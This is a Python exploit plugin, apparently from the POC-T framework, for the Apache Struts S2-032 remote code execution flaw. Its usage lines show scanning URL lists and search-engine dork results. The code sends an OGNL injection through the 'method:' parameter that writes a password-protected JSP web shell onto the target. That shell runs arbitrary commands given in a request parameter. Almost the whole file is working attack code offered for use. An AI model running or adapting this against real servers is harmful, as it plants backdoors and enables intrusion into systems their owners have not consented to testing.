#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Struts S2-032 RCE PoC

Usage:
  python POC-T.py -s struts2-s2032 -iF url.txt
  python POC-T.py -s struts2-s2032 -aG "inurl:index.action"

"""

import random
import requests


def poc(url):
    try:
        if '://' not in url:
            url = 'http://' + url
        url = url.split('?')[0]
        jsp_file = str(random.randint(1000, 1000000)) + '.jsp'
        content = 'gif89a%3C%25%0A%20%20%20%20if%28%22024%22.equals%28request.' \
                  'getParameter%28%22pwd%22%29%29%29%7B%0A%20%20%20%20%20%20%2' \
                  '0%20java.io.InputStream%20in%20%3D%20Runtime.getRuntime%28%' \
                  '29.exec%28request.getParameter%28%22l%22%29%29.getInputStre' \
                  'am%28%29%3B%0A%20%20%20%20%20%20%20%20int%20a%20%3D%20-1%3B' \
                  '%0A%20%20%20%20%20%20%20%20byte%5B%5D%20b%20%3D%20new%20byt' \
                  'e%5B2048%5D%3B%0A%20%20%20%20%20%20%20%20out.print%28%22%3C' \
                  'pre%3E%22%29%3B%0A%20%20%20%20%20%20%20%20while%28%28a%3Din' \
                  '.read%28b%29%29%21%3D-1%29%7B%0A%20%20%20%20%20%20%20%20%20' \
                  '%20%20%20out.println%28new%20String%28b%29%29%3B%0A%20%20%2' \
                  '0%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20out.print%28%' \
                  '22%3C%2fpre%3E%22%29%3B%0A%20%20%20%20%7D%0A%25%3E'

        poc_url = "{url}?method:%23_memberAccess%3d@ognl.OgnlContext" \
                  "@DEFAULT_MEMBER_ACCESS,%23a%3d%23parameters.reqobj[0]," \
                  "%23c%3d%23parameters.reqobj[1],%23req%3d%23context.get(%23a)," \
                  "%23b%3d%23req.getRealPath(%23c)%2b%23parameters.reqobj[2],%23" \
                  "fos%3dnew java.io.FileOutputStream(%23b),%23fos.write(%23para" \
                  "meters.content[0].getBytes()),%23fos.close(),%23hh%3d%23conte" \
                  "xt.get(%23parameters.rpsobj[0]),%23hh.getWriter().println(%23" \
                  "b),%23hh.getWriter().flush(),%23hh.getWriter().close(),1?%23x" \
                  "x:%23request.toString&reqobj=com.opensymphony.xwork2.dispatch" \
                  "er.HttpServletRequest&rpsobj=com.opensymphony.xwork2.dispatch" \
                  "er.HttpServletResponse&reqobj=%2f&reqobj={filename}&content={" \
                  "content}".format(url=url, filename=jsp_file, content=content)

        s = requests.get(poc_url,
                         headers={'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0'},
                         timeout=10)
        return bool(s.status_code == 200 and jsp_file in s.content and 'method:' not in s.content)
    except Exception:
        return False
